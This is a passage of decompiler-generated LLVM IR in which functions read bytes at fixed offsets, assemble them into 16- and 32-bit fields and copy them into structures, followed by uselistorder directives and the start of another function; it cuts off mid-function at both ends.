  %v2_156ac = inttoptr i32 %v1_156ac to i8*
  %v3_156ac = load i8, i8* %v2_156ac, align 1
  %v4_156ac = zext i8 %v3_156ac to i32
  %v1_156b0 = add i32 %v0_15698, 47
  %v2_156b0 = inttoptr i32 %v1_156b0 to i8*
  %v3_156b0 = load i8, i8* %v2_156b0, align 1
  %v4_156b0 = zext i8 %v3_156b0 to i32
  %v4_156b4 = mul nuw nsw i32 %v4_15698, 256
  %v5_156b4 = or i32 %v4_156a0, %v4_156b4
  %v4_156b8 = mul nuw nsw i32 %v4_1569c, 256
  %v5_156b8 = or i32 %v4_156a4, %v4_156b8
  store i32 %v5_156b8, i32* %r3.global-to-local, align 4
  %v1_156bc = add i32 %v0_15698, 51
  %v2_156bc = inttoptr i32 %v1_156bc to i8*
  %v3_156bc = load i8, i8* %v2_156bc, align 1
  %v4_156bc = zext i8 %v3_156bc to i32
  %v4_156c0 = mul nuw nsw i32 %v4_156a8, 65536
  %v5_156c0 = or i32 %v4_156c0, %v5_156b4
  %v4_156c4 = mul nuw nsw i32 %v4_156ac, 65536
  %v5_156c4 = or i32 %v4_156c4, %v5_156b8
  %v4_156c8 = mul nuw i32 %v4_156b0, 16777216
  %v5_156c8 = or i32 %v5_156c0, %v4_156c8
  %v4_156cc = mul nuw i32 %v4_156bc, 16777216
  %v5_156cc = or i32 %v5_156c4, %v4_156cc
  store i32 %v5_156cc, i32* %r3.global-to-local, align 4
  %v1_156e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_156e0 = add i32 %v1_156e0, 44
  %v3_156e0 = inttoptr i32 %v2_156e0 to i32*
  store i32 %v5_156c8, i32* %v3_156e0, align 4
  %v0_156e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_156e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_156e4 = add i32 %v1_156e4, 48
  %v3_156e4 = inttoptr i32 %v2_156e4 to i32*
  store i32 %v0_156e4, i32* %v3_156e4, align 4
  %v0_156e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_156e8 = add i32 %v0_156e8, 53
  %v2_156e8 = inttoptr i32 %v1_156e8 to i8*
  %v3_156e8 = load i8, i8* %v2_156e8, align 1
  %v4_156e8 = zext i8 %v3_156e8 to i32
  %v1_156ec = add i32 %v0_156e8, 52
  %v2_156ec = inttoptr i32 %v1_156ec to i8*
  %v3_156ec = load i8, i8* %v2_156ec, align 1
  %v4_156ec = zext i8 %v3_156ec to i32
  store i32 %v4_156ec, i32* %r3.global-to-local, align 4
  %v1_156f0 = add i32 %v0_156e8, 54
  %v2_156f0 = inttoptr i32 %v1_156f0 to i8*
  %v3_156f0 = load i8, i8* %v2_156f0, align 1
  %v4_156f0 = zext i8 %v3_156f0 to i32
  %v4_156f4 = mul nuw nsw i32 %v4_156e8, 256
  %v5_156f4 = or i32 %v4_156ec, %v4_156f4
  store i32 %v5_156f4, i32* %r3.global-to-local, align 4
  %v1_156f8 = add i32 %v0_156e8, 55
  %v2_156f8 = inttoptr i32 %v1_156f8 to i8*
  %v3_156f8 = load i8, i8* %v2_156f8, align 1
  %v4_156f8 = zext i8 %v3_156f8 to i32
  %v4_156fc = mul nuw nsw i32 %v4_156f0, 65536
  %v5_156fc = or i32 %v4_156fc, %v5_156f4
  %v4_15700 = mul nuw i32 %v4_156f8, 16777216
  %v5_15700 = or i32 %v5_156fc, %v4_15700
  store i32 %v5_15700, i32* %r3.global-to-local, align 4
  %v1_15704 = load i32, i32* %r7.global-to-local, align 4
  %v2_15704 = add i32 %v1_15704, 52
  %v3_15704 = inttoptr i32 %v2_15704 to i32*
  store i32 %v5_15700, i32* %v3_15704, align 4
  %v0_15708 = load i32, i32* %r4.global-to-local, align 4
  %v1_15708 = add i32 %v0_15708, 57
  %v2_15708 = inttoptr i32 %v1_15708 to i8*
  %v3_15708 = load i8, i8* %v2_15708, align 1
  %v4_15708 = zext i8 %v3_15708 to i32
  %v1_1570c = add i32 %v0_15708, 56
  %v2_1570c = inttoptr i32 %v1_1570c to i8*
  %v3_1570c = load i8, i8* %v2_1570c, align 1
  %v4_1570c = zext i8 %v3_1570c to i32
  %v1_15710 = add i32 %v0_15708, 60
  %v2_15710 = inttoptr i32 %v1_15710 to i8*
  %v3_15710 = load i8, i8* %v2_15710, align 1
  %v4_15710 = zext i8 %v3_15710 to i32
  store i32 %v4_15710, i32* %r3.global-to-local, align 4
  %v1_15714 = add i32 %v0_15708, 61
  %v2_15714 = inttoptr i32 %v1_15714 to i8*
  %v3_15714 = load i8, i8* %v2_15714, align 1
  %v4_15714 = zext i8 %v3_15714 to i32
  %v1_15718 = add i32 %v0_15708, 58
  %v2_15718 = inttoptr i32 %v1_15718 to i8*
  %v3_15718 = load i8, i8* %v2_15718, align 1
  %v4_15718 = zext i8 %v3_15718 to i32
  %v1_1571c = add i32 %v0_15708, 62
  %v2_1571c = inttoptr i32 %v1_1571c to i8*
  %v3_1571c = load i8, i8* %v2_1571c, align 1
  %v4_1571c = zext i8 %v3_1571c to i32
  %v1_15720 = add i32 %v0_15708, 59
  %v2_15720 = inttoptr i32 %v1_15720 to i8*
  %v3_15720 = load i8, i8* %v2_15720, align 1
  %v4_15720 = zext i8 %v3_15720 to i32
  %v4_15724 = mul nuw nsw i32 %v4_15708, 256
  %v5_15724 = or i32 %v4_1570c, %v4_15724
  %v4_15728 = mul nuw nsw i32 %v4_15714, 256
  %v5_15728 = or i32 %v4_15728, %v4_15710
  store i32 %v5_15728, i32* %r3.global-to-local, align 4
  %v1_1572c = add i32 %v0_15708, 63
  %v2_1572c = inttoptr i32 %v1_1572c to i8*
  %v3_1572c = load i8, i8* %v2_1572c, align 1
  %v4_1572c = zext i8 %v3_1572c to i32
  %v4_15730 = mul nuw nsw i32 %v4_15718, 65536
  %v5_15730 = or i32 %v4_15730, %v5_15724
  %v4_15734 = mul nuw nsw i32 %v4_1571c, 65536
  %v5_15734 = or i32 %v4_15734, %v5_15728
  %v4_15738 = mul nuw i32 %v4_1572c, 16777216
  %v5_15738 = or i32 %v5_15734, %v4_15738
  %v4_1573c = mul nuw i32 %v4_15720, 16777216
  %v5_1573c = or i32 %v5_15730, %v4_1573c
  store i32 %v5_15738, i32* %r3.global-to-local, align 4
  %v1_1574c = load i32, i32* %r7.global-to-local, align 4
  %v2_1574c = add i32 %v1_1574c, 56
  %v3_1574c = inttoptr i32 %v2_1574c to i32*
  store i32 %v5_1573c, i32* %v3_1574c, align 4
  %v0_15750 = load i32, i32* %r3.global-to-local, align 4
  %v1_15750 = load i32, i32* %r7.global-to-local, align 4
  %v2_15750 = add i32 %v1_15750, 60
  %v3_15750 = inttoptr i32 %v2_15750 to i32*
  store i32 %v0_15750, i32* %v3_15750, align 4
  %v0_15754 = load i32, i32* %r4.global-to-local, align 4
  %v1_15754 = add i32 %v0_15754, 65
  %v2_15754 = inttoptr i32 %v1_15754 to i8*
  %v3_15754 = load i8, i8* %v2_15754, align 1
  %v4_15754 = zext i8 %v3_15754 to i32
  %v1_15758 = add i32 %v0_15754, 64
  %v2_15758 = inttoptr i32 %v1_15758 to i8*
  %v3_15758 = load i8, i8* %v2_15758, align 1
  %v4_15758 = zext i8 %v3_15758 to i32
  store i32 %v4_15758, i32* %r3.global-to-local, align 4
  %v1_1575c = add i32 %v0_15754, 66
  %v2_1575c = inttoptr i32 %v1_1575c to i8*
  %v3_1575c = load i8, i8* %v2_1575c, align 1
  %v4_1575c = zext i8 %v3_1575c to i32
  %v4_15760 = mul nuw nsw i32 %v4_15754, 256
  %v5_15760 = or i32 %v4_15758, %v4_15760
  store i32 %v5_15760, i32* %r3.global-to-local, align 4
  %v1_15764 = add i32 %v0_15754, 67
  %v2_15764 = inttoptr i32 %v1_15764 to i8*
  %v3_15764 = load i8, i8* %v2_15764, align 1
  %v4_15764 = zext i8 %v3_15764 to i32
  %v4_15768 = mul nuw nsw i32 %v4_1575c, 65536
  %v5_15768 = or i32 %v4_15768, %v5_15760
  %v4_1576c = mul nuw i32 %v4_15764, 16777216
  %v5_1576c = or i32 %v5_15768, %v4_1576c
  store i32 %v5_1576c, i32* %r3.global-to-local, align 4
  %v1_15770 = load i32, i32* %r7.global-to-local, align 4
  %v2_15770 = add i32 %v1_15770, 64
  %v3_15770 = inttoptr i32 %v2_15770 to i32*
  store i32 %v5_1576c, i32* %v3_15770, align 4
  %v0_15774 = load i32, i32* %r4.global-to-local, align 4
  %v1_15774 = add i32 %v0_15774, 73
  %v2_15774 = inttoptr i32 %v1_15774 to i8*
  %v3_15774 = load i8, i8* %v2_15774, align 1
  %v4_15774 = zext i8 %v3_15774 to i32
  %v1_15778 = add i32 %v0_15774, 72
  %v2_15778 = inttoptr i32 %v1_15778 to i8*
  %v3_15778 = load i8, i8* %v2_15778, align 1
  %v4_15778 = zext i8 %v3_15778 to i32
  store i32 %v4_15778, i32* %r3.global-to-local, align 4
  %v1_1577c = add i32 %v0_15774, 74
  %v2_1577c = inttoptr i32 %v1_1577c to i8*
  %v3_1577c = load i8, i8* %v2_1577c, align 1
  %v4_1577c = zext i8 %v3_1577c to i32
  %v4_15780 = mul nuw nsw i32 %v4_15774, 256
  %v5_15780 = or i32 %v4_15778, %v4_15780
  store i32 %v5_15780, i32* %r3.global-to-local, align 4
  %v1_15784 = add i32 %v0_15774, 75
  %v2_15784 = inttoptr i32 %v1_15784 to i8*
  %v3_15784 = load i8, i8* %v2_15784, align 1
  %v4_15784 = zext i8 %v3_15784 to i32
  %v4_15788 = mul nuw nsw i32 %v4_1577c, 65536
  %v5_15788 = or i32 %v4_15788, %v5_15780
  %v4_1578c = mul nuw i32 %v4_15784, 16777216
  %v5_1578c = or i32 %v5_15788, %v4_1578c
  store i32 %v5_1578c, i32* %r3.global-to-local, align 4
  %v1_15790 = load i32, i32* %r7.global-to-local, align 4
  %v2_15790 = add i32 %v1_15790, 72
  %v3_15790 = inttoptr i32 %v2_15790 to i32*
  store i32 %v5_1578c, i32* %v3_15790, align 4
  %v0_15794 = load i32, i32* %r4.global-to-local, align 4
  %v1_15794 = add i32 %v0_15794, 81
  %v2_15794 = inttoptr i32 %v1_15794 to i8*
  %v3_15794 = load i8, i8* %v2_15794, align 1
  %v4_15794 = zext i8 %v3_15794 to i32
  %v1_15798 = add i32 %v0_15794, 80
  %v2_15798 = inttoptr i32 %v1_15798 to i8*
  %v3_15798 = load i8, i8* %v2_15798, align 1
  %v4_15798 = zext i8 %v3_15798 to i32
  store i32 %v4_15798, i32* %r3.global-to-local, align 4
  %v1_1579c = add i32 %v0_15794, 82
  %v2_1579c = inttoptr i32 %v1_1579c to i8*
  %v3_1579c = load i8, i8* %v2_1579c, align 1
  %v4_1579c = zext i8 %v3_1579c to i32
  %v4_157a0 = mul nuw nsw i32 %v4_15794, 256
  %v5_157a0 = or i32 %v4_15798, %v4_157a0
  store i32 %v5_157a0, i32* %r3.global-to-local, align 4
  %v1_157a4 = add i32 %v0_15794, 83
  %v2_157a4 = inttoptr i32 %v1_157a4 to i8*
  %v3_157a4 = load i8, i8* %v2_157a4, align 1
  %v4_157a4 = zext i8 %v3_157a4 to i32
  %v4_157a8 = mul nuw nsw i32 %v4_1579c, 65536
  %v5_157a8 = or i32 %v4_157a8, %v5_157a0
  %v4_157ac = mul nuw i32 %v4_157a4, 16777216
  %v5_157ac = or i32 %v5_157a8, %v4_157ac
  store i32 %v5_157ac, i32* %r3.global-to-local, align 4
  %v1_157b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_157b0 = add i32 %v1_157b0, 80
  %v3_157b0 = inttoptr i32 %v2_157b0 to i32*
  store i32 %v5_157ac, i32* %v3_157b0, align 4
  %v0_157b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_157b4 = add i32 %v0_157b4, 69
  %v2_157b4 = inttoptr i32 %v1_157b4 to i8*
  %v3_157b4 = load i8, i8* %v2_157b4, align 1
  %v4_157b4 = zext i8 %v3_157b4 to i32
  %v1_157b8 = add i32 %v0_157b4, 68
  %v2_157b8 = inttoptr i32 %v1_157b8 to i8*
  %v3_157b8 = load i8, i8* %v2_157b8, align 1
  %v4_157b8 = zext i8 %v3_157b8 to i32
  store i32 %v4_157b8, i32* %r3.global-to-local, align 4
  %v1_157bc = add i32 %v0_157b4, 70
  %v2_157bc = inttoptr i32 %v1_157bc to i8*
  %v3_157bc = load i8, i8* %v2_157bc, align 1
  %v4_157bc = zext i8 %v3_157bc to i32
  %v4_157c0 = mul nuw nsw i32 %v4_157b4, 256
  %v5_157c0 = or i32 %v4_157b8, %v4_157c0
  store i32 %v5_157c0, i32* %r3.global-to-local, align 4
  %v1_157c4 = add i32 %v0_157b4, 71
  %v2_157c4 = inttoptr i32 %v1_157c4 to i8*
  %v3_157c4 = load i8, i8* %v2_157c4, align 1
  %v4_157c4 = zext i8 %v3_157c4 to i32
  %v4_157c8 = mul nuw nsw i32 %v4_157bc, 65536
  %v5_157c8 = or i32 %v4_157c8, %v5_157c0
  %v4_157cc = mul nuw i32 %v4_157c4, 16777216
  %v5_157cc = or i32 %v5_157c8, %v4_157cc
  store i32 %v5_157cc, i32* %r3.global-to-local, align 4
  %v1_157d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_157d0 = add i32 %v1_157d0, 68
  %v3_157d0 = inttoptr i32 %v2_157d0 to i32*
  store i32 %v5_157cc, i32* %v3_157d0, align 4
  %v0_157d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_157d4 = add i32 %v0_157d4, 77
  %v2_157d4 = inttoptr i32 %v1_157d4 to i8*
  %v3_157d4 = load i8, i8* %v2_157d4, align 1
  %v4_157d4 = zext i8 %v3_157d4 to i32
  %v1_157d8 = add i32 %v0_157d4, 76
  %v2_157d8 = inttoptr i32 %v1_157d8 to i8*
  %v3_157d8 = load i8, i8* %v2_157d8, align 1
  %v4_157d8 = zext i8 %v3_157d8 to i32
  store i32 %v4_157d8, i32* %r3.global-to-local, align 4
  %v1_157dc = add i32 %v0_157d4, 78
  %v2_157dc = inttoptr i32 %v1_157dc to i8*
  %v3_157dc = load i8, i8* %v2_157dc, align 1
  %v4_157dc = zext i8 %v3_157dc to i32
  %v4_157e0 = mul nuw nsw i32 %v4_157d4, 256
  %v5_157e0 = or i32 %v4_157d8, %v4_157e0
  store i32 %v5_157e0, i32* %r3.global-to-local, align 4
  %v1_157e4 = add i32 %v0_157d4, 79
  %v2_157e4 = inttoptr i32 %v1_157e4 to i8*
  %v3_157e4 = load i8, i8* %v2_157e4, align 1
  %v4_157e4 = zext i8 %v3_157e4 to i32
  %v4_157e8 = mul nuw nsw i32 %v4_157dc, 65536
  %v5_157e8 = or i32 %v4_157e8, %v5_157e0
  %v4_157ec = mul nuw i32 %v4_157e4, 16777216
  %v5_157ec = or i32 %v5_157e8, %v4_157ec
  store i32 %v5_157ec, i32* %r3.global-to-local, align 4
  %v1_157f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_157f0 = add i32 %v1_157f0, 76
  %v3_157f0 = inttoptr i32 %v2_157f0 to i32*
  store i32 %v5_157ec, i32* %v3_157f0, align 4
  %v0_157f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_157f4 = add i32 %v0_157f4, 85
  %v2_157f4 = inttoptr i32 %v1_157f4 to i8*
  %v3_157f4 = load i8, i8* %v2_157f4, align 1
  %v4_157f4 = zext i8 %v3_157f4 to i32
  %v1_157f8 = add i32 %v0_157f4, 84
  %v2_157f8 = inttoptr i32 %v1_157f8 to i8*
  %v3_157f8 = load i8, i8* %v2_157f8, align 1
  %v4_157f8 = zext i8 %v3_157f8 to i32
  store i32 %v4_157f8, i32* %r3.global-to-local, align 4
  %v1_157fc = add i32 %v0_157f4, 86
  %v2_157fc = inttoptr i32 %v1_157fc to i8*
  %v3_157fc = load i8, i8* %v2_157fc, align 1
  %v4_157fc = zext i8 %v3_157fc to i32
  %v4_15800 = mul nuw nsw i32 %v4_157f4, 256
  %v5_15800 = or i32 %v4_157f8, %v4_15800
  store i32 %v5_15800, i32* %r3.global-to-local, align 4
  %v1_15804 = add i32 %v0_157f4, 87
  %v2_15804 = inttoptr i32 %v1_15804 to i8*
  %v3_15804 = load i8, i8* %v2_15804, align 1
  %v4_15804 = zext i8 %v3_15804 to i32
  %v4_15808 = mul nuw nsw i32 %v4_157fc, 65536
  %v5_15808 = or i32 %v4_15808, %v5_15800
  %v4_1580c = mul nuw i32 %v4_15804, 16777216
  %v5_1580c = or i32 %v5_15808, %v4_1580c
  store i32 %v5_1580c, i32* %r3.global-to-local, align 4
  %v1_15810 = load i32, i32* %r7.global-to-local, align 4
  %v2_15810 = add i32 %v1_15810, 84
  %v3_15810 = inttoptr i32 %v2_15810 to i32*
  store i32 %v5_1580c, i32* %v3_15810, align 4
  ret i32 %v4_15714

; uselistorder directives
  uselistorder i32 %v4_15714, { 1, 0 }
  uselistorder i32 %v0_15708, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_15698, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_15648, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_15568, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %tmp, { 6, 5, 3, 4, 2, 1, 0, 7 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 69, { 1, 0 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i32 80, { 1, 2, 5, 3, 4, 0, 6 }
  uselistorder i32 59, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 55, { 2, 4, 0, 3, 1 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 2, 0, 3 }
  uselistorder i32 51, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 47, { 4, 5, 6, 7, 0, 8, 1, 9, 2, 10, 11, 3 }
  uselistorder i32 50, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 49, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 45, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 39, { 5, 6, 0, 1, 7, 2, 8, 3, 9, 4 }
  uselistorder i32 35, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 38, { 4, 3, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11 }
  uselistorder i32 34, { 5, 0, 1, 6, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 37, { 3, 0, 4, 1, 5, 6, 7, 8, 2, 9 }
  uselistorder i32 33, { 9, 2, 0, 12, 1, 10, 3, 11, 4, 5, 6, 13, 7, 14, 8, 15, 16 }
  uselistorder i32 30, { 5, 0, 9, 4, 1, 6, 2, 7, 3, 8, 10 }
  uselistorder i32 29, { 7, 1, 0, 8, 9, 5, 2, 3, 4, 6 }
  uselistorder i32 26, { 5, 0, 1, 2, 6, 3, 7, 4, 8, 9 }
  uselistorder i32 25, { 12, 24, 25, 3, 0, 4, 13, 5, 14, 6, 15, 11, 16, 17, 18, 1, 19, 7, 20, 2, 21, 8, 9, 22, 10, 23, 26, 27 }
  uselistorder i32 23, { 6, 1, 0, 2, 7, 3, 8, 4, 9, 11, 12, 10, 5 }
  uselistorder i32 22, { 11, 1, 16, 2, 3, 4, 5, 0, 6, 12, 7, 13, 8, 14, 17, 15, 9, 10, 18 }
  uselistorder i32 21, { 8, 3, 1, 9, 4, 10, 5, 11, 6, 12, 13, 14, 7, 0, 15, 2, 16 }
  uselistorder i32 19, { 8, 13, 14, 15, 4, 9, 1, 5, 10, 6, 11, 7, 12, 0, 19, 16, 2, 17, 3, 18 }
  uselistorder i32 18, { 15, 20, 21, 22, 4, 0, 5, 1, 2, 6, 7, 16, 8, 17, 9, 18, 14, 10, 3, 19, 23, 11, 24, 12, 25, 13, 26 }
  uselistorder i32 17, { 12, 15, 0, 4, 31, 32, 5, 33, 34, 6, 1, 30, 13, 14, 7, 16, 8, 17, 9, 18, 10, 19, 11, 20, 21, 2, 22, 23, 24, 3, 25, 26, 27, 28, 29 }
  uselistorder i32 6, { 41, 44, 14, 15, 89, 16, 2, 17, 42, 0, 83, 18, 84, 43, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 4, 30, 31, 32, 33, 34, 5, 35, 45, 46, 47, 6, 48, 49, 50, 51, 7, 52, 53, 54, 55, 8, 56, 9, 57, 58, 59, 36, 60, 10, 61, 62, 63, 37, 64, 11, 65, 66, 67, 38, 68, 69, 70, 71, 72, 39, 73, 12, 74, 75, 76, 77, 78, 79, 40, 80, 13, 81, 1, 82, 85, 86, 87, 88 }
  uselistorder i32 96, { 1, 0, 2, 3 }
}

define i32 @function_1581c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1581c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1581c = load i32, i32* @r4, align 4
  store i32 %v3_1581c, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_15834 = inttoptr i32 %arg2 to i8*
  %v3_15834 = call i32 @function_13cd0(i8* %v2_15834, i32 0)
  store i32 %v3_15834, i32* %r0.global-to-local, align 4
  %v0_15838 = load i32, i32* %r5.global-to-local, align 4
  %v1_15838 = inttoptr i32 %v0_15838 to i32*
  %v2_15838 = load i32, i32* %v1_15838, align 4
  store i32 %v2_15838, i32* %r3.global-to-local, align 4
  %v1_1583c = add i32 %v0_15838, 4
  %v2_1583c = inttoptr i32 %v1_1583c to i32*
  %v3_1583c = load i32, i32* %v2_1583c, align 4
  store i32 %v3_1583c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_15844 = load i32, i32* %r6.global-to-local, align 4
  %v1_15844 = inttoptr i32 %v0_15844 to i32*
  store i32 %v2_15838, i32* %v1_15844, align 4
  %v3_15844 = add i32 %v0_15844, 4
  %v4_15844 = inttoptr i32 %v3_15844 to i32*
  %v5_15844 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15844, i32* %v4_15844, align 4
  %v0_15848 = load i32, i32* %r2.global-to-local, align 4
  %v1_15848 = load i32, i32* %r6.global-to-local, align 4
  %v2_15848 = add i32 %v1_15848, 12
  %v3_15848 = inttoptr i32 %v2_15848 to i32*
  store i32 %v0_15848, i32* %v3_15848, align 4
  %v0_1584c = load i32, i32* %r5.global-to-local, align 4
  %v1_1584c = add i32 %v0_1584c, 9
  %v2_1584c = inttoptr i32 %v1_1584c to i8*
  %v3_1584c = load i8, i8* %v2_1584c, align 1
  %v4_1584c = zext i8 %v3_1584c to i32
  store i32 %v4_1584c, i32* %r2.global-to-local, align 4
  %v1_15850 = add i32 %v0_1584c, 8
  %v2_15850 = inttoptr i32 %v1_15850 to i8*
  %v3_15850 = load i8, i8* %v2_15850, align 1
  %v4_15850 = zext i8 %v3_15850 to i32
  %v4_15854 = mul nuw nsw i32 %v4_1584c, 256
  %v5_15854 = or i32 %v4_15850, %v4_15854
  store i32 %v5_15854, i32* %r3.global-to-local, align 4
  %v1_15858 = load i32, i32* %r6.global-to-local, align 4
  %v2_15858 = add i32 %v1_15858, 16
  %v3_15858 = inttoptr i32 %v2_15858 to i32*
  store i32 %v5_15854, i32* %v3_15858, align 4
  %v0_1585c = load i32, i32* %r5.global-to-local, align 4
  %v1_1585c = add i32 %v0_1585c, 11
  %v2_1585c = inttoptr i32 %v1_1585c to i8*
  %v3_1585c = load i8, i8* %v2_1585c, align 1
  %v4_1585c = zext i8 %v3_1585c to i32
  store i32 %v4_1585c, i32* %r2.global-to-local, align 4
  %v1_15860 = add i32 %v0_1585c, 10
  %v2_15860 = inttoptr i32 %v1_15860 to i8*
  %v3_15860 = load i8, i8* %v2_15860, align 1
  %v4_15860 = zext i8 %v3_15860 to i32
  %v4_15864 = mul nuw nsw i32 %v4_1585c, 256
  %v5_15864 = or i32 %v4_15860, %v4_15864
  store i32 %v5_15864, i32* %r3.global-to-local, align 4
  %v1_15868 = load i32, i32* %r6.global-to-local, align 4
  %v2_15868 = add i32 %v1_15868, 20
  %v3_15868 = inttoptr i32 %v2_15868 to i32*
  store i32 %v5_15864, i32* %v3_15868, align 4
  %v0_1586c = load i32, i32* %r5.global-to-local, align 4
  %v1_1586c = add i32 %v0_1586c, 13
  %v2_1586c = inttoptr i32 %v1_1586c to i8*
  %v3_1586c = load i8, i8* %v2_1586c, align 1
  %v4_1586c = zext i8 %v3_1586c to i32
  store i32 %v4_1586c, i32* %r2.global-to-local, align 4
  %v1_15870 = add i32 %v0_1586c, 12
  %v2_15870 = inttoptr i32 %v1_15870 to i8*
  %v3_15870 = load i8, i8* %v2_15870, align 1
  %v4_15870 = zext i8 %v3_15870 to i32
  %v4_15874 = mul nuw nsw i32 %v4_1586c, 256
  %v5_15874 = or i32 %v4_15870, %v4_15874
  store i32 %v5_15874, i32* %r3.global-to-local, align 4
  %v1_15878 = load i32, i32* %r6.global-to-local, align 4
  %v2_15878 = add i32 %v1_15878, 24
  %v3_15878 = inttoptr i32 %v2_15878 to i32*
  store i32 %v5_15874, i32* %v3_15878, align 4
  %v0_1587c = load i32, i32* %r5.global-to-local, align 4
  %v1_1587c = add i32 %v0_1587c, 20
  %v2_1587c = inttoptr i32 %v1_1587c to i32*
  %v3_1587c = load i32, i32* %v2_1587c, align 4
  store i32 %v3_1587c, i32* %r3.global-to-local, align 4
  %v1_15880 = add i32 %v0_1587c, 14
  %v2_15880 = inttoptr i32 %v1_15880 to i8*
  %v3_15880 = load i8, i8* %v2_15880, align 1
  %v4_15880 = zext i8 %v3_15880 to i32
  store i32 %v4_15880, i32* %r0.global-to-local, align 4
  %v1_15884 = add i32 %v0_1587c, 15
  %v2_15884 = inttoptr i32 %v1_15884 to i8*
  %v3_15884 = load i8, i8* %v2_15884, align 1
  %v4_15884 = zext i8 %v3_15884 to i32
  store i32 %v4_15884, i32* %ip.global-to-local, align 4
  %v1_15888 = add i32 %v0_1587c, 16
  %v2_15888 = inttoptr i32 %v1_15888 to i32*
  %v3_15888 = load i32, i32* %v2_15888, align 4
  store i32 %v3_15888, i32* %r1.global-to-local, align 4
  %v1_1588c = load i32, i32* %r6.global-to-local, align 4
  %v2_1588c = add i32 %v1_1588c, 44
  %v3_1588c = inttoptr i32 %v2_1588c to i32*
  store i32 %v3_1587c, i32* %v3_1588c, align 4
  %v0_15890 = load i32, i32* %r5.global-to-local, align 4
  %v1_15890 = add i32 %v0_15890, 24
  %v2_15890 = inttoptr i32 %v1_15890 to i32*
  %v3_15890 = load i32, i32* %v2_15890, align 4
  store i32 %v3_15890, i32* %r3.global-to-local, align 4
  %v1_15894 = load i32, i32* %r6.global-to-local, align 4
  %v2_15894 = add i32 %v1_15894, 48
  %v3_15894 = inttoptr i32 %v2_15894 to i32*
  store i32 %v3_15890, i32* %v3_15894, align 4
  %v0_15898 = load i32, i32* %r5.global-to-local, align 4
  %v1_15898 = add i32 %v0_15898, 28
  %v2_15898 = inttoptr i32 %v1_15898 to i32*
  %v3_15898 = load i32, i32* %v2_15898, align 4
  store i32 %v3_15898, i32* %r3.global-to-local, align 4
  %v1_1589c = load i32, i32* %r6.global-to-local, align 4
  %v2_1589c = add i32 %v1_1589c, 52
  %v3_1589c = inttoptr i32 %v2_1589c to i32*
  store i32 %v3_15898, i32* %v3_1589c, align 4
  %v0_158a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_158a0 = add i32 %v0_158a0, 32
  %v2_158a0 = inttoptr i32 %v1_158a0 to i32*
  %v3_158a0 = load i32, i32* %v2_158a0, align 4
  store i32 %v3_158a0, i32* %r3.global-to-local, align 4
  %v1_158a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_158a4 = add i32 %v1_158a4, 56
  %v3_158a4 = inttoptr i32 %v2_158a4 to i32*
  store i32 %v3_158a0, i32* %v3_158a4, align 4
  %v0_158a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_158a8 = add i32 %v0_158a8, 40
  %v2_158a8 = inttoptr i32 %v1_158a8 to i32*
  %v3_158a8 = load i32, i32* %v2_158a8, align 4
  store i32 %v3_158a8, i32* %r3.global-to-local, align 4
  %v1_158ac = load i32, i32* %r6.global-to-local, align 4
  %v2_158ac = add i32 %v1_158ac, 64
  %v3_158ac = inttoptr i32 %v2_158ac to i32*
  store i32 %v3_158a8, i32* %v3_158ac, align 4
  %v0_158b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_158b0 = add i32 %v0_158b0, 48
  %v2_158b0 = inttoptr i32 %v1_158b0 to i32*
  %v3_158b0 = load i32, i32* %v2_158b0, align 4
  store i32 %v3_158b0, i32* %r3.global-to-local, align 4
  %v1_158b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_158b4 = add i32 %v1_158b4, 72
  %v3_158b4 = inttoptr i32 %v2_158b4 to i32*
  store i32 %v3_158b0, i32* %v3_158b4, align 4
  %v0_158b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_158b8 = add i32 %v0_158b8, 36
  %v2_158b8 = inttoptr i32 %v1_158b8 to i32*
